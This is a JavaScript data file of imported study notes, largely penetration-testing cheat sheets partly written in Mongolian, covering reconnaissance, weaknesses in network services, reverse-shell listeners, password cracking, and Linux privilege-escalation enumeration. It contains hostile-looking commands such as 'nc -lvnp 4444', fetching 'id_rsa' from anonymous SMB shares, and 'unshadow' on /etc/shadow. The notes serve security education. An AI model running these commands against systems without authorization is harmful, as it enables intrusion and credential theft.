export const importedKnowledgeNotes = [
  {
    "id": 10001,
    "title": "netcat",
    "room": "active recon",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "active-recon",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: active recon/netcat.md",
    "content": "📂 ADD THIS TO YOUR OBSIDIAN VAULT\n\n> ==**Title: Active Reconnaissance - Netcat (nc) Swiss Army Knife**==\nTags: #ActiveRecon #Netcat #Networking #BannerGrabbing #ReverseShell\n\n>     ==**Client Mode (Banner Grabbing):**==\n\n>         TCP Banner Grab: ==nc [TARGET_IP] [PORT]==\n> \n>         UDP Probing: ==nc -u [TARGET_IP] [PORT]==\n\n>     ==**Server Mode (The Catcher's Mitt):**==\n\n>         ==Catch Reverse Shells / File Transfers: ==nc -lvnp [PORT]====\n> \n>         ==-n = Numeric only (prevents DNS resolution delays and log leaks).==\n\n>     **==Protocol Differences:==**\n\n>         **==Port 80 (HTTP): Requires manual GET / HTTP/1.1 request.**==\n> \n>         ==**Port 21 (FTP) & Port 25 (SMTP): Transmits automatic 220 service greeting banners upon connection.==**\n\n```\n    Modern Alternative: ==ncat== (from Nmap project) supports ==--ssl== for encrypted listeners and banner grabs on TLS ports (Port 443 / 465).\n```",
    "sourcePath": "active recon/netcat.md"
  },
  {
    "id": 10002,
    "title": "traceroute",
    "room": "active recon",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "active-recon",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: active recon/traceroute.md",
    "content": "📂 ADD THIS TO YOUR OBSIDIAN VAULT\n\n> ==**Title: Active Reconnaissance - Traceroute & TTL Mechanics**==\nTags: #Networking #ActiveRecon #Traceroute #ICMP #TTL\n\n```\n    Mechanism: Exploits the IP header ==TTL (Time To Live)== field. Routers decrement TTL by 1; when TTL=0, the router drops the packet and returns an ==ICMP Type 11 (Time-to-Live Exceeded)== message.\n\n```\n    Probe Modes:\n> \n>         **Linux default: ==UDP== (Ports 33434+)**\n> \n>         **Windows default: ==ICMP== (tracert)**\n> \n>         **TCP Mode (WAF/Firewall Bypass): ==traceroute -T -p 80 [TARGET_IP]==**\n> \n>         **ICMP Mode on Linux: ==traceroute -I [TARGET_IP]==**\n\n    mtr (My Traceroute): Combines traceroute and ping into a live, real-time diagnostic dashboard showing continuous packet loss and jitter per hop.",
    "sourcePath": "active recon/traceroute.md"
  },
  {
    "id": 10003,
    "title": "cheatshit 1",
    "room": "cheater",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "cheater",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "3 min",
    "date": "KS import",
    "excerpt": "KS source: cheater/cheatshit 1.md",
    "content": "🧠 Cybersecurity Field Guide\n\n> **Purpose:** Turn a dense technical cheat sheet into a visual, memorable Obsidian note.\n> \n> ⚠️ **Use only on systems, networks, binaries, and labs you are explicitly authorized to test.**\n\n---\n\n# 🗺️ The Big Picture\n\nThink of the whole workflow as a game map:\n\n```\n🛰️ RECON\n   ↓\n🚪 SERVICES\n   ↓\n🔓 ACCESS\n   ↓\n⬆️ PRIV ESC\n   ↓\n🔬 REVERSE ENGINEERING\n   ↓\n📦 FIRMWARE\n```\n\n### 🧩 Memory Hook\n\n> **“See → Enter → Rise → Understand → Extract”**\n\n|Stage|Question to remember|\n|---|---|\n|🛰️ Recon|**What exists?**|\n|🚪 Services|**What is exposed?**|\n|🔓 Access|**Can the service be abused?**|\n|⬆️ Priv Esc|**How do I go higher?**|\n|🔬 RE|**What is the binary doing?**|\n|📦 Firmware|**What is hidden inside?**|\n🛰️ SECTION 1 — RECONNAISSANCE & FOOTPRINTING\n\n## 1A. Passive Recon — 🥷 “See without touching”\n\n> **Goal:** Map the attack surface without sending a packet to the target.\n\n### 🧠 Remember: **W-D-C-S**\n\n**W**HOIS → **D**NS → **C**RTs → **S**hodan/Censys\n\n---\n\n### 🌐 1. WHOIS / RDAP\n\n**Ports:** TCP `43` / HTTPS `443`\n\n```\nwhois target.com | grep -iE \"Registrar:|Name Server:|Creation Date|Expiration Date\"\n```\n\n```\ncurl -s https://rdap.verisign.com/com/v1/domain/target.com | jq .\n```\n\n### 🎯 Look for\n\n- 📅 **Expiration dates** → renewal phishing / hijacking\n    \n- 🌍 **Authoritative nameservers** → hints about infrastructure / WAF presence\n    \n\n---\n\n### 🧭 2. DNS Interrogation\n\n**Port:** UDP/TCP `53`\n\n```\ndig @1.1.1.1 target.com [A|AAAA|CNAME|MX|TXT]\n```\n\nClean output:\n\n```\ndig +short target.com [TYPE]\n```\n\n### 🔍 DNS clues\n\n|Record|Memory image|What to notice|\n|---|---|---|\n|`A`|🏠 IPv4 house|Main IPv4 destination|\n|`AAAA`|🏢 IPv6 building|Compare with `A`|\n|`CNAME`|🪧 Sign pointing elsewhere|Possible dangling alias|\n|`TXT`|📝 Sticky note|SPF / DMARC policy|\n\n> 🧠 **AAAА = “Another Address?”**  \n> Compare IPv6 with IPv4.\n\n> 🧠 **CNAME = “Can Name Mean Elsewhere?”**\n\n> 🧠 **TXT = “Text tells trust.”**\n\nSource examples:\n\n- `AAAA` → compare against `A` for IPv4-only filtering assumptions\n    \n- `CNAME` → look for dangling aliases to deleted S3/GitHub resources\n    \n- `TXT` → inspect SPF and DMARC; the source notes that `p=none` allows email spoofing\n    \n\n---\n\n### 📜 3. Certificate Transparency — crt.sh\n\nPublic certificate logs can reveal subdomains that are not openly advertised.\n\n```\nhttps://crt.sh/?q=%.target.com\n```\n\nCLI extraction:\n\n```\ncurl -s \"https://crt.sh/?q=%.target.com&output=json\" | jq -r '.[].name_value' | sort -u\n```\n\n### 🧠 Memory\n\n> **Certificates remember names.**\n\n---\n\n### 🌍 4. Internet-Wide Scanners\n\n**Shodan / Censys**\n\nExample syntax:\n\n```\nhostname:\"target.com\"\norg:\"Target Corp\"\nproduct:\"Apache\"\nport:80\n```\n\n### 🎯 Look for\n\n- 🗄️ Unindexed databases\n    \n    - MySQL `3306`\n        \n    - Redis `6379`\n        \n- 🛠️ Exposed administration panels\n    \n- 🌐 Recursive DNS resolvers\n    \n\n---\n\n## 1B. Active Recon — 🎯 “Now interact”\n\n> **Goal:** Establish live ground truth by interacting directly with network sockets.\n\n### 🧠 Memory Hook: **P-B-N**\n\n**P**ath → **B**anners → **N**map\n\n---\n\n### 📡 1. Host Discovery & Path Diagnostics\n\n#### Ping\n\n```\nping -c 4 [TARGET_IP]\n```\n\n### TTL clue from the source\n\n```\n≈ 64   → Linux\n≈ 128  → Windows\n```\n\n#### Route mapping\n\n```\ntraceroute [TARGET_IP]\n```\n\n- Linux default → UDP\n    \n- Windows `tracert` → ICMP\n    \n\n#### TCP-based route probing\n\n```\ntraceroute -T -p 80 [TARGET_IP]\n```\n\n> 🧠 **Traceroute = “How do I get there?”**\n\n---\n\n### 📢 2. Banner Grabbing\n\n#### Netcat\n\n```\nnc [TARGET_IP] [PORT]\n```\n\nSource note:\n\n- FTP `21`\n    \n- SMTP `25`\n    \n\n#### Manual HTTP/1.1 probe\n\n```\nnc [TARGET_IP] 80\n```\n\nThen send:\n\n```\nGET / HTTP/1.1\nHost: target\n```\n\nThen:\n\n```\nDouble Enter\n```\n\n#### Headers only\n\n```\ncurl -I http://[TARGET_IP]\n```\n\n> 🧠 **Banner = “Who are you?”**\n\n---\n\n### 🧭 3. Nmap Precision Scanning\n\n#### Full port scan\n\n```\nnmap -p- -T4 [TARGET_IP]\n```\n\n#### Service/version detection\n\n```\nnmap -sV -sC -Pn -p [PORTS] [TARGET_IP]\n```\n\n#### SYN scan\n\n```\nnmap -sS -p [PORTS] [TARGET_IP]\n```\n",
    "sourcePath": "cheater/cheatshit 1.md"
  },
  {
    "id": 10004,
    "title": "cheatshit 2",
    "room": "cheater",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "cheater",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "7 min",
    "date": "KS import",
    "excerpt": "KS source: cheater/cheatshit 2.md",
    "content": "🧠 Cybersecurity Field Guide\n\n> **Purpose:** Turn a dense technical cheat sheet into a visual, memorable Obsidian note.\n> \n> ⚠️ **Use only on systems, networks, binaries, and labs you are explicitly authorized to test.**\n\n---\n\n# 🗺️ The Big Picture\n\nThink of the whole workflow as a game map:\n\n```\n🛰️ RECON\n   ↓\n🚪 SERVICES\n   ↓\n🔓 ACCESS\n   ↓\n⬆️ PRIV ESC\n   ↓\n🔬 REVERSE ENGINEERING\n   ↓\n📦 FIRMWARE\n```\n\n### 🧩 Memory Hook\n\n> **“See → Enter → Rise → Understand → Extract”**\n\n|Stage|Question to remember|\n|---|---|\n|🛰️ Recon|**What exists?**|\n|🚪 Services|**What is exposed?**|\n|🔓 Access|**Can the service be abused?**|\n|⬆️ Priv Esc|**How do I go higher?**|\n|🔬 RE|**What is the binary doing?**|\n|📦 Firmware|**What is hidden inside?**|\n# # 🌐 SECTION 2 — NETWORK SERVICE EXPLOITATION\n\nЧи нэг серверийг төсөөл:\n\n```\n                    🏠 SERVER\n              ┌──────────────────┐\n              │                  │\n              │     Linux        │\n              │                  │\n              │  🚪21            │── FTP\n              │  🚪22            │── SSH\n              │  🚪23            │── Telnet\n              │  🚪25            │── SMTP\n              │  🚪445           │── SMB\n              │  🚪2049          │── NFS\n              │  🚪3306          │── MySQL\n              │                  │\n              └──────────────────┘\n```\n\nЧи эхлээд:\n\n> **“Ямар хаалганууд байна?”**\n\nгэж асууна.\n\nДараа нь:\n\n> **“Хаалга бүрийн цаана хэн байгаа вэ?”**\n\nТэгээд хамгийн сүүлд:\n\n> **“Тэр хүн/үйлчилгээ аюулгүй ажиллаж байна уу?”**\n\n---\n\n# 🧠 1. PORT ≠ SERVICE\n\nЭнэ ялгааг эхлээд маш сайн ойлго.\n\nЖишээ:\n\n```\n22\n```\n\nгэдэг нь өөрөө SSH биш.\n\nХарин:\n\n```\n🚪 Port 22\n   ↓\n⚙️ SSH service\n```\n\nгэсэн **default convention**.\n\nӨөр service өөр port дээр ажиллаж болно.\n\nТиймээс:\n\n> **Port бол дугаарласан хаалга. Service бол тэр хаалгаар ярьж байгаа хүн.**\n\n---\n\n# 🚪 21 — FTP\n\n```\n21 → FTP\n```\n\nFTP-г:\n\n# 📦 “Файл агуулахын хаалга”\n\nгэж төсөөл.\n\nХаалганы цаана:\n\n```\n📁 files\n📄 documents\n📦 backups\n```\n\nбайна.\n\nТэгэхээр FTP харахад:\n\n> “Хэн file access хийж чаддаг вэ?”\n\nгэдгийг бодно.\n\nSource дээр дурдсан гол санаа:\n\n```\nanonymous login\n```\n\nөөрөөр хэлбэл:\n\n> **“Нэргүй хүн оруулж байна уу?”**\n\nгэж шалгана.\n\n### 🧠 Memory\n\n> **FTP = File Transfer = Files behind the door**\n\n---\n\n# 🚪 22 — SSH\n\n```\n22 → SSH\n```\n\nSSH-г:\n\n# 🗝️ “Server-ийн remote front door”\n\nгэж төсөөл.\n\n```\n👤 User\n   ↓\n🚪 22\n   ↓\n🔐 SSH\n   ↓\n💻 Shell\n```\n\nSSH дээр source-ийн гол санаа:\n\n```\nprivate keys\npassword reuse\n```\n\nӨөрөөр хэлбэл:\n\n> **“Энэ хаалганы түлхүүрийг хаанаас олж болох вэ?”**\n\nгэж бодно.\n\n### 🧠 Memory\n\n> **SSH = Shell door**\n\n---\n\n# 🚪 23 — Telnet\n\n```\n23 → Telnet\n```\n\nTelnet-г хуучин:\n\n# 📞 “Шилэн цонхтой хаалга”\n\nгэж төсөөл.\n\nЯагаад?\n\nУчир нь Telnet нь encryption-гүй cleartext communication-тэй холбоотой.\n\nТиймээс:\n\n```\n👤 User\n   ↓\n📞 Telnet\n   ↓\nusername/password\n   ↓\n👀 network дээр ил харагдаж болно\n```\n\nгэсэн mental model ашиглаж болно.\n\nSource дээр:\n\n```\ncleartext sniffing\nunauthenticated backdoors\nblind RCE\n```\n\nгэж байна.\n\nТиймээс Telnet харахад:\n\n> **“Энэ үйлчилгээ мэдээллээ хамгаалж байна уу?”**\n\nгэж асуу.\n\n---\n\n# 🚪 25 — SMTP\n\n```\n25 → SMTP\n```\n\nSMTP = mail-ийн хаалга.\n\nТөсөөл:\n\n```\n📨 EMAIL OFFICE\n       │\n       ▼\n     🚪 25\n       │\n       ▼\n   SMTP server\n```\n\nSource дээр:\n\n```\nVRFY\n```\n\nгэх мэт user enumeration-тэй холбоотой зүйл байна.\n\nТэгэхээр:\n\n> **“Энэ mail server өөрийнхөө хэрэглэгчдийг хэт их мэдээлж байна уу?”**\n\nгэж ойлго.\n\nМөн relay configuration чухал сэдэв.\n\n---\n\n# 🚪 139 / 445 — SMB\n\nОдоо хамгийн сонирхолтой хаалганы нэг.\n\n# 🪟 SMB = Windows File Cabinet\n\nSMB-г:\n\n> 🗄️ **Network-д холбогдсон shared filing cabinet**\n\nгэж төсөөл.\n\n```\nServer\n  │\n  ├── 📁 public\n  ├── 📁 backup\n  ├── 📁 finance\n  └── 📁 shared\n```\n\nSMB шалгахдаа:\n\n> **“Хэн эдгээр share-уудыг харж/уншиж/өөрчилж чаддаг вэ?”**\n\nгэж бодно.\n\n---\n\n# 🕳️ SMB Null Session\n\nЭнийг:\n\n> **“Хаалга тогшиход нэрээ ч асуухгүйгээр дотор оруулчихлаа.”**\n\nгэж төсөөл.\n\n```\nYOU\n ↓\n🚪 SMB\n ↓\n\"Who are you?\"\n ↓\n\"Nobody.\"\n ↓\n\"Okay, come in.\" 😐\n```\n\nТэгэхээр:\n\n```\nenum4linux -a [TARGET_IP]\n```\n\nгэх мэт enumeration-ийн санаа нь:\n\n> **“Anonymous access ямар мэдээлэл гаргаж байна?”**\n\nгэдгийг шалгах.\n\n---\n\n# 📦 `smbclient`\n\n```\nsmbclient //[TARGET_IP]/[SHARE_NAME] -U Anonymous\n```\n\nЭнэ:\n\n> **“Share руу anonymous байдлаар холбогдож үзье.”**\n\nгэсэн санаа.\n\nSource-ийн:\n\n```\nget id_rsa\nget backup.zip\n```\n\nгэдэг жишээнүүд нь accessible share-оос sensitive files байгаа эсэхийг шалгах концепц.\n\n---\n\n# 🧠 SMB MEMORY\n\n> **SMB = Shares May Betray**\n\nЭнэ memory trick чинь сайн.\n\n---\n\n# 🚪 2049 / 111 — NFS\n\nNFS-г:\n\n# 📚 “Network File Shelf”\n\nгэж төсөөл.\n\nНэг Linux machine өөрийн filesystem-ийн хэсгийг network дээр экспортолжээ.\n\n```\nSERVER\n┌────────────────┐\n│ 📁 /home       │\n│ 📁 /backup     │\n│ 📁 /share      │\n└────────────────┘\n        │\n        │ export\n        ▼\n     🌐 NETWORK\n        │\n        ▼\n      CLIENT\n```\n\n---\n\n# 🔍 `showmount -e`\n\n```\nshowmount -e [TARGET_IP]\n```\n\nЭнэ:\n\n> **“Server network дээр ямар directories export хийж байна?”**\n\nгэсэн асуулт.\n\nMental image:\n\n```\nSERVER\n\n📚 EXPORT LIST\n├── /home\n├── /backup\n└── /share\n```\n\n---\n\n# 🧱 Mount\n\n```\nmount ...\n```\n\nгэдгийг өмнөх firmware section-тэй адил:\n\n> **“Remote filesystem-ийг өөрийн directory tree дээр залгах.”**\n\nгэж төсөөл.\n\n---\n\n# ☠️ `no_root_squash`\n\nЭнэ concept маш чухал.\n\nNFS client дээрх root user-ийг server талд “энгийн” user болгон map хийж хамгаалах mechanism байдаг.\n\n`no_root_squash` нь тэр хамгаалалтыг сулруулсан configuration байж болно.\n\nMental picture:\n\n```\nNORMAL:\n\nClient 👑 root\n      ↓\nNFS\n      ↓\nServer дээр restrained identity\n\n\nno_root_squash:\n\nClient 👑 root\n      ↓\nNFS\n      ↓\n👑 root-like identity\n```\n\nТиймээс энэ нь:\n\n> **“Network filesystem root-д хэр их итгэж байна?”**\n\nгэсэн асуулт болдог.\n\n---\n\n# 🧠 NFS MEMORY\n\n> **NFS = Network File Shelf**\n\nХарин security angle:\n\n> **“Who is allowed to touch the shelf, and as whom?”**\n\n---\n\n# 🎬 2B — BLIND RCE\n\nОдоо service exploitation-ийн маш гоё concept.\n\nЗаримдаа command ажилласан ч:\n\n```\n💻 target\n   ↓\ncommand executes\n   ↓\n❓ no output\n```\n\nбайж болно.\n\nЧи:\n\n> “Ажилласан уу? 😕”\n\nгэж мэдэхгүй.\n\n---\n\n# 🕵️ The Wiretap\n\nТэгвэл output харахын оронд **side effect** хүлээж болно.\n\nЖишээ source:\n\n```\nsudo tcpdump ip proto \\icmp -i tun0\n```\n\nдараа нь target талаас ping trigger хийж:\n\n```\nTarget\n   ↓\nICMP\n   ↓\nKali\n```\n\nгэсэн network event хүлээж байна.\n\n---\n\n# 🧠 Яагаад энэ clever вэ?\n\nЧи command-ийн output харахгүй.\n\nГэхдээ command:\n\n```\nping <your-ip>\n```\n\nажилласан бол:\n\n```\n📡 ICMP packet\n      ↓\n👀 packet capture\n      ↓\n\"I didn't see output,\n but I saw the side effect.\"\n```\n\nгэсэн логик.\n\n### 🧠 Маш чухал концепц:\n\n> **No output ≠ No execution**\n\nХарин:\n\n> **Observable side effect = evidence**\n\nЭнэ бол debugging, exploit validation, incident response гээд маш олон cybersecurity context-д хэрэгтэй mindset.\n\n---\n\n# 🔄 REVERSE SHELL — “Target calls you”\n\nЭнийг шууд visualization болго.\n\nЕрдийн shell:\n\n```\nYOU\n ↓\nTARGET\n```\n\nЧи target руу холбогдоно.\n\nReverse shell:\n\n```\nTARGET\n   │\n   │ outbound connection\n   ▼\n YOUR LISTENER\n```\n\nТиймээс:\n\n# 📞 Reverse shell = “Target calls you.”\n\n---\n\n# 🎧 Listener\n\nSource:\n\n```\nnc -lvnp 4444\n```\n\nҮүнийг:\n\n> **“Би 4444 дээр утсаа бариад хүлээж байна.”**\n\nгэж төсөөл.\n\n```\nKali\n\n☎️ Port 4444\n\"Hello?\nI'm waiting...\"\n```\n\nTarget outbound connection хийвэл:\n\n```\nTARGET\n   │\n   │ 📞\n   └──────────────► KALI\n                    │\n                    ▼\n                 shell\n```\n\n---\n\n# 🧠 `nc -lvnp`\n\nЭнд flags-ийг бас story болго:\n\n```\n-l → 👂 Listen\n-v → 🗣️ Verbose\n-n → 🚫 DNS lookup хийхгүй\n-p → 🚪 Port\n```\n\n### Memory:\n\n> **Listen → Verbose → No DNS → Port**\n\n---\n\n# 🔑 2C — PASSWORD AUDITING\n\nОдоо өөр нэг scene.\n\nЧи:\n\n```\n🔐 LOGIN DOOR\n```\n\nоллоо.\n\nPassword мэдэхгүй.\n\nЭнд хамгийн чухал ялгаа:\n\n# 🌐 ONLINE vs 📴 OFFLINE\n\n---\n\n# 🐍 Hydra = ONLINE\n\nHydra-г:\n\n> **“Хаалгыг дахин дахин тогшдог robot.”**\n\nгэж төсөөл.\n\n```\nHydra\n  ↓\n\"password1?\"\n❌\n\n\"password2?\"\n❌\n\n\"password3?\"\n❌\n\n...\n```\n\nБүх оролдлого:\n\n```\nNETWORK\n   ↓\nLOGIN SERVICE\n```\n\nрүү явж байна.\n\nТиймээс:\n\n> **Hydra = online password auditing**\n\nгэж санана.\n\nМэдээж энэ төрлийн testing-ийг зөвхөн өөрийн/зөвшөөрөгдсөн систем дээр хийх ёстой.\n\n---\n\n# 🧠 John = OFFLINE\n\nОдоо password database-ийн hash гартаа байна гэж бод.\n\n```\n🔐 HASH\n```\n\nЧи network login хийхгүй.\n\nКомпьютер дээрээ өөрөө оролдож байна:\n\n```\ncandidate password\n       ↓\nhash\n       ↓\ncompare\n```\n\nТиймээс:\n\n> **John = offline password auditing**\n\n---\n\n# 🧮 Hashcat = мөн OFFLINE\n\nHashcat ч адил:\n\n```\nHASH\n ↓\nGPU/CPU\n ↓\ncandidate generation\n ↓\ncompare\n```\n\nгэсэн mental model.\n\n---\n\n# 🔥 Иймээс энэ хэсгийн хамгийн чухал ялгаа\n\n```\nHYDRA\n🌐 Online\n   ↓\nNetwork service\n   ↓\nLogin attempts\n\nJOHN\n📴 Offline\n   ↓\nLocal hashes\n   ↓\nPassword candidates\n\nHASHCAT\n📴 Offline\n   ↓\nLocal hashes\n   ↓\nHigh-performance cracking\n```\n\n### 🧠 Memory:\n\n> **Hydra asks the DOOR.**\n> \n> **John/Hashcat asks the HASH.**\n\n---\n\n# 🧩 `unshadow`\n\n```\nunshadow /etc/passwd /etc/shadow\n```\n\nЭнийг:\n\n> **“Account information + password hash information-ийг cracking tool-д тохирох байдлаар нийлүүлэх.”**\n\nгэж ойлго.\n\n```\n/etc/passwd\n      +\n/etc/shadow\n      ↓\nunshadow\n      ↓\ncombined input\n```\n\n---\n\n# 🧠 ОДОО БҮХ SERVICE-Г НЭГ БАЙШИН БОЛГОЁ\n\n```\n                    🏠 SERVER\n                       │\n       ┌───────────────┼────────────────┐\n       │               │                │\n       ▼               ▼                ▼\n    🚪 21           🚪 22            🚪 23\n     FTP             SSH             Telnet\n     📦              🔑                📞\n    files           shell           cleartext\n       │\n       │\n       ├──────── 🚪25 → SMTP → 📨 mail\n       │\n       ├──────── 🚪139/445 → SMB → 🗄️ shares\n       │\n       ├──────── 🚪111/2049 → NFS → 📚 exports\n       │\n       └──────── 🚪3306 → MySQL → 🗃️ database\n```\n\n---\n\n# 🎯 Service харах үед асуух 4 асуулт\n\nЭнэ бол миний бодлоор энэ бүх section-ийн **хамгийн үнэ цэнтэй concept**.\n\nЯмар ч service харсан:\n\n### 1️⃣ WHO?\n\n> Хэн authentication хийж байна?\n\n### 2️⃣ WHAT?\n\n> Ямар data/resource өгч байна?\n\n### 3️⃣ HOW?\n\n> Ямар authentication/configuration ашиглаж байна?\n\n### 4️⃣ TRUST?\n\n> Anonymous access, weak permissions, insecure configuration байна уу?\n\n---\n\n# 🧠 PORT MEMORY WALL\n\n```\n21    → 📦 FTP    → files\n22    → 🔑 SSH    → shell\n23    → 📞 Telnet → old/cleartext remote access\n25    → 📨 SMTP   → mail\n139/445\n      → 🗄️ SMB    → shares\n111/2049\n      → 📚 NFS    → network filesystem\n3306  → 🗃️ MySQL  → database\n```\n\nГэхдээ **port = service гэсэн 100% дүрэм биш**. Эдгээр нь default/common associations.\n\n---\n\n# 🔥 SECTION 2 SUPER MEMORY\n\nЭнийг Obsidian дээрээ хамгийн дээд талд хадгалж болно:\n\n```\n🚪 PORT\n   ↓\n⚙️ SERVICE\n   ↓\n👤 AUTHENTICATION\n   ↓\n📦 DATA / RESOURCE\n   ↓\n🔐 CONFIGURATION\n   ↓\n💥 WEAKNESS\n```\n\nТэгээд service бүр дээр:\n\n```\nFTP\n→ \"What files?\"\n\nSSH\n→ \"Whose keys?\"\n\nTelnet\n→ \"Is communication protected?\"\n\nSMTP\n→ \"Who can I learn about?\"\n\nSMB\n→ \"What shares trust me?\"\n\nNFS\n→ \"What filesystem is exported?\"\n\nMySQL\n→ \"Who can authenticate, and what data is exposed?\"\n```\n\nИнгэж ойлговол **21, 22, 23, 25, 445, 2049, 3306 гэсэн тоонууд дангаараа уйтгартай цээжлэх зүйл биш** болно.\n\nЧи тэднийг:\n\n> **📦 File room → 🔑 Shell door → 📞 Old phone → 📨 Mail room → 🗄️ Shared cabinet → 📚 Network shelf → 🗃️ Database vault**\n\nгэсэн **7 өөр өрөөтэй серверийн байшин** гэж харж эхэлнэ.\n\nТэгээд exploit method цээжлэхээс өмнө **“энэ хаалганы цаана яг ямар trust relationship байна?”** гэж асуудаг болно. Энэ нь network-service exploitation-ийг ойлгох хамгийн сайн суурь mental model.",
    "sourcePath": "cheater/cheatshit 2.md"
  },
  {
    "id": 10005,
    "title": "cheatshit 3",
    "room": "cheater",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "cheater",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "6 min",
    "date": "KS import",
    "excerpt": "KS source: cheater/cheatshit 3.md",
    "content": "# 🏰 LINUX CASTLE — Privilege Escalation Story\n\nЧи аль хэдийн Linux machine-д shell-тэй болсон.\n\n```\n🌐 Outside\n    ↓\n👤 YOU\n    ↓\n🏰 Linux\n```\n\nГэхдээ чи одоогоор:\n\n```\nUID = 1000\n👤 ordinary user\n```\n\nбайж магадгүй.\n\nХарин дээд давхарт:\n\n```\n👑 ROOT\n```\n\nсууж байна.\n\nЧиний зорилго:\n\n> **“Би root болох ямар legitimate weakness / misconfiguration байгааг олох вэ?”**\n\nТэгээд чи castle-аа нэг бүрчлэн шалгана.\n\n---\n\n# 🗺️ Бүх storyline\n\n```\n           🏰 LINUX CASTLE\n                  │\n                  ▼\n           👤 WHO AM I?\n                  │\n                  ▼\n        🔑 WHAT POWER DO I HAVE?\n                  │\n                  ▼\n        🚪 WHAT SPECIAL DOORS?\n                  │\n                  ▼\n          ⏰ WHAT RUNS BY ITSELF?\n                  │\n                  ▼\n          📄 WHAT FILES EXIST?\n                  │\n                  ▼\n         👀 WHAT IS RUNNING?\n                  │\n                  ▼\n          ✍️ WHAT CAN I WRITE?\n                  │\n                  ▼\n          🧬 IS KERNEL OLD?\n                  │\n                  ▼\n               👑 ROOT?\n```\n\nОдоо хэсэг хэсгээр нь.\n\n---\n\n# 🎬 ACT 1 — “Би яг ХЭН бэ?”\n\nЭхний хэсэг:\n\n```\nid\nhostname\nuname -a\ncat /etc/os-release\npwd\n```\n\nЭнэ бол **өөрийгөө болон байшингаа таних 5 асуулт**.\n\n---\n\n## 🪪 `id` = Би хэн бэ?\n\n```\nid\n```\n\nЧи өөрийн:\n\n```\nUID\nGID\ngroups\n```\n\nзэргийг харна.\n\nЖишээ:\n\n```\nuid=1000(karen)\n```\n\nгэсэн бол:\n\n```\n👤 Karen\nUID 1000\n```\n\nХэрэв:\n\n```\nuid=0(root)\n```\n\nбол...\n\n😂\n\n```\n\"Яагаад би root-ын өрөөнд аль хэдийн сууж байгаа юм?\"\n```\n\n---\n\n## 🏷️ `hostname` = Энэ ямар байшин бэ?\n\n```\nhostname\n```\n\nжишээ:\n\n```\nweb-server-01\n```\n\nТэгэхээр:\n\n```\n👤 You\n🏠 web-server-01\n```\n\n---\n\n## 🧬 `uname -a` = Ямар дотор эрхтэнтэй вэ?\n\nЭнэ бол машины **kernel + architecture** мэдээллийг харах.\n\n```\n🐧 Linux\n🧠 Kernel\n💻 Architecture\n```\n\n---\n\n## 📋 `/etc/os-release` = Ямар төрлийн Linux вэ?\n\n```\ncat /etc/os-release\n```\n\nЭнэ:\n\n```\nUbuntu\nDebian\nFedora\n...\n```\n\nгэх мэт distribution-ийг хэлнэ.\n\n---\n\n## 📍 `pwd` = Би яг аль өрөөнд байна?\n\n```\npwd\n```\n\nЖишээ:\n\n```\n/home/karen\n```\n\nТэгэхээр:\n\n```\n🏰 /home\n   └── 👤 karen\n          ↑\n         YOU\n```\n\n---\n\n# 🧠 ACT 1 MEMORY\n\nЭнэ 5-ыг:\n\n> **WHO → HOUSE → ENGINE → OS → ROOM**\n\nгэж сана.\n\n```\nid                → 👤 WHO?\nhostname          → 🏠 WHICH MACHINE?\nuname -a          → 🧠 WHICH KERNEL?\nos-release        → 🐧 WHICH OS?\npwd               → 📍 WHERE AM I?\n```\n\n---\n\n# 🎬 ACT 2 — “Надад ямар 🔑 түлхүүр байна?”\n\nОдоо чи:\n\n```\ncat /etc/passwd\ncat /etc/group\nsudo -l\n```\n\nгэж харна.\n\n---\n\n# 👥 `/etc/passwd`\n\nЭнэ бол **castle-ийн иргэдийн бүртгэл**.\n\n```\nroot\nalice\nbob\nkaren\nservice-user\n...\n```\n\nгэдэг шиг account-ууд байж болно.\n\nMental image:\n\n```\n📖 PEOPLE BOOK\n\n👑 root\n👤 alice\n👤 bob\n🤖 backup\n🤖 service\n```\n\nЧи:\n\n> “Энд ямар төрлийн хүмүүс байна?”\n\nгэж асууж байна.\n\n---\n\n# 👪 `/etc/group`\n\nХарин энэ:\n\n> **“Хэн ямар клубт ордог вэ?”**\n\nгэдгийг харуулна.\n\n```\nKaren\n ├── users\n ├── sudo\n ├── docker\n └── developers\n```\n\nгэх мэт.\n\n### Гол санаа:\n\n```\npasswd → WHO\ngroup  → WHO WITH WHOM\n```\n\n---\n\n# 👑 `sudo -l`\n\nЭнэ бол хамгийн чухал асуултуудын нэг:\n\n> **“Root надад ямар түлхүүр зээлүүлсэн бэ?”**\n\n```\nsudo -l\n```\n\nЖишээ нь хэрэглэгчид тодорхой command privileged context-д ажиллуулах эрх өгсөн байж болно.\n\nТэгээд чи:\n\n```\n🔑 My allowed privileges\n```\n\nгэсэн жагсаалт харж байна.\n\n### 🧠 Memory:\n\n> **`sudo -l` = “What power has root already given me?”**\n\n---\n\n# 🎬 ACT 3 — “Нууц хаалга байна уу?”\n\nОдоо SUID / SGID / capabilities руу орно.\n\nЭндээс гол idea:\n\n> **Зарим программ энгийн хэрэглэгчээс илүү тусгай эрхтэй ажиллаж чаддаг.**\n\n---\n\n# 🗝️ SUID = Owner-ийн ID card өмсөх\n\n```\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nЭнд:\n\n```\n4000 = SUID\n```\n\nгэж сана.\n\nMental image:\n\n```\n👤 YOU\n   ↓\n🚪 SUID PROGRAM\n   ↓\n🪪 \"Би owner-ийн badge зүүсэн.\"\n```\n\nТиймээс SUID executable харагдвал:\n\n> **“Энэ программ ямар эрхтэй ажиллаж байна?”**\n\nгэж асууна.\n\n---\n\n# 👥 SGID\n\n```\nfind / -perm -2000 -type f 2>/dev/null\n```\n\nЭнэ удаа:\n\n```\n2000 = SGID\n```\n\nGroup identity-тэй холбоотой тусгай behavior.\n\n### Санах арга:\n\n```\n4000 → SUID → 👤 USER\n2000 → SGID → 👥 GROUP\n```\n\n---\n\n# 🧩 Capabilities\n\n```\ngetcap -r / 